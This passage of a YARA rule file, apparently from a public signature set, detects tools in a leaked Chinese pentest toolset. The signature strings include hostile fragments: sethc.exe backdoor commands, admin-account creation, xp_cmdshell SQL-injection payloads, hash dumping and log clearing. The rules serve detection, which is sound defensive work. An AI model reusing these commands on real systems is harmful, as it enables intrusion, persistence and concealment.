\"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1020, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s -slave  ConnectHost ConnectPort TransmitHost TransmitPort\" fullword ascii\n      $s2 = \"Enter Your Socks Type No: [0.BindPort 1.ConnectBack 2.Listen]:\" fullword ascii\n      $s3 = \"[SERVER]connection to %s:%d error\" fullword ascii\n      $s4 = \"%s -connect ConnectHost [ConnectPort]       Default:%d\" fullword ascii\n      $s5 = \"[+] got, ip:%s, port:%d\" fullword ascii\n      $s6 = \"[-] There is a error...Create a new connection.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule CN_Honker_DictionaryGenerator_RID3284 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file DictionaryGenerator.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:08:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"`PasswordBuilder\" fullword ascii\n      $s2 = \"cracker\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3650KB and all of them\n}\n\nrule CN_Honker_ms11080_withcmd_RID2FF0 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ms11080_withcmd.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:18:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage : ms11-080.exe cmd.exe Command \" fullword ascii\n      $s3 = \"[>] create pipe error\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 340KB and all of them\n}\n\nrule CN_Honker_T00ls_Lpk_Sethc_v2_RID313D : CHINA DEMO EXE FILE HKTL T1546_008 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v2.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:14:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1546_008\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LOADER ERROR\" fullword ascii\n      $s2 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n      $s3 = \"2011-2012 T00LS&RICES\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule CN_Honker_HASH_32_RID2CAF : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file 32.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 09:59:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"[Undefined OS version]  Major: %d Minor: %d\" fullword ascii\n      $s8 = \"Try To Run As Administrator ...\" fullword ascii\n      $s9 = \"Specific LUID NOT found\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and all of them\n}\n\nrule CN_Honker_windows_mstsc_enhanced_RMDSTC_RID361C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file RMDSTC.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 16:41:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"zava zir5@163.com\" fullword wide\n      $s1 = \"By newccc\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule CN_Honker_sig_3389_mstsc_MSTSCAX_RID324B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file MSTSCAX.DLL\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:59:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ResetPasswordWWWx\" fullword ascii\n      $s2 = \"Terminal Server Redirected Printer Doc\" fullword wide\n      $s3 = \"Cleaning temp directory\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule CN_Honker_T00ls_scanner_RID2FA3 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file T00ls_scanner.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:05:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://cn.bing.com/search?first=1&count=50&q=ip:\" fullword wide\n      $s17 = \"Team:www.t00ls.net\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 330KB and all of them\n}\n\nrule CN_Honker_GetHashes_RID2E43 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file GetHashes.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:07:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SAM\\\\Domains\\\\Account\\\\Users\\\\Names registry hive reading error!\" fullword ascii\n      $s1 = \"GetHashes <SAM registry file> [System key file]\" fullword ascii\n      $s2 = \"Note: Windows registry file shall begin from 'regf' signature!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 87KB and 2 of them\n}\n\nrule CN_Honker_hashq_Hashq_RID2F30 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Hashq.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:46:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Hashq.exe\" fullword wide\n      $s5 = \"CnCert.Net\" fullword wide\n      $s6 = \"Md5 query tool\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them\n}\n\nrule CN_Honker_ShiftBackdoor_Server_RID32C0 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Server.dat\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:18:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"del /q /f %systemroot%system32sethc.exe\" fullword ascii\n      $s1 = \"cacls %s /t /c /e /r administrators\" fullword ascii\n      $s2 = \"\\\\dllcache\\\\sethc.exe\" ascii\n      $s3 = \"\\\\ntvdm.exe\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule CN_Honker_exp_win2003_RID2E86 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file win2003.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:18:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage:system_exp.exe \\\"cmd\\\"\" fullword ascii\n      $s2 = \"The shell \\\"cmd\\\" success!\" fullword ascii\n      $s4 = \"Not Windows NT family OS.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule CN_Honker_Interception3389_setup_RID3322 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file setup.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:34:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\\\\%s\" fullword ascii\n      $s1 = \"%s\\\\temp\\\\temp%d.bat\" fullword ascii\n      $s5 = \"EventStartShell\" fullword ascii\n      $s6 = \"del /f /q \\\"%s\\\"\" fullword ascii\n      $s7 = \"\\\\wminotify.dll\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule CN_Honker_CnCerT_CCdoor_CMD_2_RID3143 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file CnCerT.CCdoor.CMD.dll2\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:15:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cmd.dll\" fullword wide\n      $s1 = \"cmdpath\" fullword ascii\n      $s2 = \"Get4Bytes\" fullword ascii\n      $s3 = \"ExcuteCmd\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 22KB and all of them\n}\n\nrule CN_Honker_exp_ms11046_RID2E4F : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ms11046.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:09:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"[*] Token system command\" fullword ascii\n      $s1 = \"[*] command add user 90sec 90sec\" fullword ascii\n      $s2 = \"[*] Add to Administrators success\" fullword ascii\n      $s3 = \"Program: %s%s%s%s%s%s%s%s%s%s%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule CN_Honker_Master_beta_1_7_RID3054 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Master_beta_1.7.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:35:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://seo.chinaz.com/?host=\" fullword ascii\n      $s2 = \"Location: getpass.asp?info=\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 312KB and all of them\n}\n\nrule CN_Honker_F4ck_Team_f4ck_2_RID304D : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file f4ck_2.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:34:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"F4ck.exe\" fullword wide\n      $s2 = \"@Netapi32.dll\" fullword ascii\n      $s3 = \"Team.F4ck.Net\" fullword wide\n      $s8 = \"Administrators\" fullword ascii\n      $s9 = \"F4ck Team\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and 2 of them\n}\n\nrule CN_Honker_sig_3389_80_AntiFW_RID308F : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file AntiFW.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:45:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Set TS to port:80 Successfully!\" fullword ascii\n      $s2 = \"Now,set TS to port 80\" fullword ascii\n      $s3 = \"echo. >>amethyst.reg\" fullword ascii\n      $s4 = \"del amethyst.reg\" fullword ascii\n      $s5 = \"AntiFW.cpp\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 2 of them\n}\n\nrule CN_Honker_wwwscan_gui_RID2F75 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file wwwscan_gui.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:58:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s www.target.com -p 8080 -m 10 -t 16\" fullword ascii\n      $s2 = \"/eye2007Admin_login.aspx\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 280KB and all of them\n}\n\nrule CN_Honker_SwordCollEdition_RID312C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SwordCollEdition.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:11:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"YuJianScan.exe\" fullword wide\n      $s1 = \"YuJianScan\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 225KB and all of them\n}\n\nrule CN_Honker_HconSTFportable_RID3095 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file HconSTFportable.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:46:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"HconSTFportable.exe\" fullword wide\n      $s2 = \"www.Hcon.in\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 354KB and all of them\n}\n\nrule CN_Honker_T00ls_Lpk_Sethc_v3_LPK_RID3284 : CHINA DEMO EXE FILE HKTL T1546_008 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file LPK.DAT\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:08:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1546_008\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"FreeHostKillexe.exe\" fullword ascii\n      $s2 = \"\\\\sethc.exe /G everyone:F\" ascii\n      $s3 = \"c:\\\\1.exe\" fullword ascii\n      $s4 = \"Set user Group Error! Username:\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule CN_Honker_Without_a_trace_Wywz_RID3309 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Wywz.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:30:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Symantec\\\\Norton Personal Firewall\\\\Log\\\\Content.log\" ascii\n      $s2 = \"UpdateFile=d:\\\\tool\\\\config.ini,Option\\\\\\\\proxyIp=127.0.0.1\\\\r\\\\nproxyPort=808\" ascii\n      $s3 = \"%s\\\\subinacl.exe /subkeyreg \\\"%s\\\" /Grant=%s=f /Grant=everyone=f\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1800KB and all of them\n}\n\nrule CN_Honker_LPK2_0_LPK_RID2DB5 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file LPK.DAT\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:43:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\sethc.exe /G everyone:F\" ascii\n      $s2 = \"net1 user guest guest123!@#\" fullword ascii\n      $s3 = \"\\\\dllcache\\\\sethc.exe\" ascii\n      $s4 = \"sathc.exe 211\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1030KB and all of them\n}\n\nrule CN_Honker_cleaniis_RID2E0F : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file cleaniis.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:58:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"iisantidote <logfile dir> <ip or string to hide>\" fullword ascii\n      $s4 = \"IIS log file cleaner by Scurt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule CN_Honker_arp3_7_arp3_7_RID2F3E : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file arp3.7.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:48:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"CnCerT.Net.SKiller.exe\" fullword wide\n      $s2 = \"www.80sec.com\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them\n}\n\nrule CN_Honker_exp_ms11080_RID2E4D : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ms11080.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:08:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"[*] command add user 90sec 90sec\" fullword ascii\n      $s6 = \"[*] Add to Administrators success\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 840KB and all of them\n}\n\nrule CN_Honker_Injection_transit_RID31CE : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Injection_transit.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:38:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<description>Your app description here</description> \" fullword ascii\n      $s4 = \"Copyright (C) 2003 ZYDSoft Corp.\" fullword wide\n      $s5 = \"ScriptnackgBun\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3175KB and all of them\n}\n\nrule CN_Honker_Safe3WVS_RID2D79 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Safe3WVS.EXE\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:33:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"2TerminateProcess\" fullword ascii\n      $s1 = \"mscoreei.dll\" fullword ascii\n      $s7 = \"SafeVS.exe\" fullword wide\n      $s8 = \"www.safe3.com.cn\" fullword wide\n      $s20 = \"SOFTWARE\\\\Classes\\\\Interface\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule CN_Honker_NBSI_3_0_RID2D14 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file NBSI 3.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:16:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \";use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamet\" wide\n      $s2 = \"http://localhost/1.asp?id=16\" fullword ascii\n      $s3 = \" exec master.dbo.xp_cmdshell @Z--\" fullword wide\n      $s4 = \";use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamet\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2600KB and 2 of them\n}\n\nrule CN_Honker_sig_3389_DUBrute_v3_0_RC3_2_0_RID3418 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file 2.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:15:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"IP - %d; Login - %d; Password - %d; Combination - %d\" fullword ascii\n      $s3 = \"Create %d IP@Loginl;Password\" fullword ascii\n      $s15 = \"UBrute.com\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 980KB and 2 of them\n}\n\nrule CN_Honker_clearlogs_RID2E83 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file clearlogs.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:17:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-20\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"- http://ntsecurity.nu/toolbox/clearlogs/\" ascii\n      $s4 = \"Error: Unable to clear log - \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 140KB and all of them\n}\n\nrule CN_Honker_no_net_priv_esc_AddUser_RID340B : CHINA DEMO EXE FILE HKTL T1136 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file AddUser.dll\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:13:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1136\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PECompact2\" fullword ascii\n      $s1 = \"adduser\" fullword ascii\n      $s5 = \"OagaBoxA\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 115KB and all of them\n}\n\nrule CN_Honker_Injection_RID2E6A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Injection.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:13:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://127.0.0.1/6kbbs/bank.asp\" fullword ascii\n      $s7 = \"jmPost.asp\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and all of them\n}\n\nrule CN_Honker_SQLServer_inject_Creaked_RID3418 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SQLServer_inject_Creaked.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:15:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://localhost/index.asp?id=2\" fullword ascii\n      $s2 = \"Email:zhaoxypass@yahoo.com.cn<br>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 8110KB and all of them\n}\n\nrule CN_Honker_WebScan_WebScan_RID306C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file WebScan.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:39:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wwwscan.exe\" fullword wide\n      $s2 = \"WWWScan Gui\" fullword wide\n   condition: \n      uint16 